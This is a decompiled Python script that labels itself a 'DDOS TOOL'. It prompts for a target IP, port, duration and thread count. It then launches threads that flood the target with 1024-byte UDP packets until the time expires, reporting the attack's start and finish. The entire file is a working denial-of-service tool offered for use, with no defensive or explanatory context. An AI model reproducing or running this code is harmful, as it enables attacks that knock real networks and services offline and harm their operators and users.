# Decompiled with PyLingual cmd version ( https://nizzix.xyz )
# Internal filename: ddos.py
# Bytecode version: 3.13.0rc3 (3571)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

import socket
import threading
import time
from colorama import Fore, Style

def clear():
    import os
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    print(Fore.RED + '''
    ╔══════════════════════════════╗
    ║        DDOS TOOL             ║
    ╚══════════════════════════════╝
    ''' + Style.RESET_ALL)

def attack(target_ip, target_port, duration):
    timeout = time.time() + duration
    sent = 0
    while time.time() < timeout:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(1)
            data = b'X' * 1024
            sock.sendto(data, (target_ip, target_port))
            sent += 1
        except:
            pass
    return sent

def main():
    clear()
    banner()
    target = input(Fore.YELLOW + '[?] Target IP: ' + Style.RESET_ALL).strip()
    port = input(Fore.YELLOW + '[?] Target Port: ' + Style.RESET_ALL).strip()
    duration = input(Fore.YELLOW + '[?] Duration (seconds): ' + Style.RESET_ALL).strip()
    threads = input(Fore.YELLOW + '[?] Threads: ' + Style.RESET_ALL).strip()
    
    try:
        port = int(port)
        duration = int(duration)
        threads = int(threads)
    except:
        print(Fore.RED + '[!] Invalid input' + Style.RESET_ALL)
        return
    
    print(Fore.GREEN + f'[*] Starting attack on {target}:{port} for {duration}s with {threads} threads' + Style.RESET_ALL)
    
    for i in range(threads):
        t = threading.Thread(target=attack, args=(target, port, duration), daemon=True)
        t.start()
    
    time.sleep(duration + 1)
    print(Fore.GREEN + '[*] Attack finished' + Style.RESET_ALL)

if __name__ == '__main__':
    main()
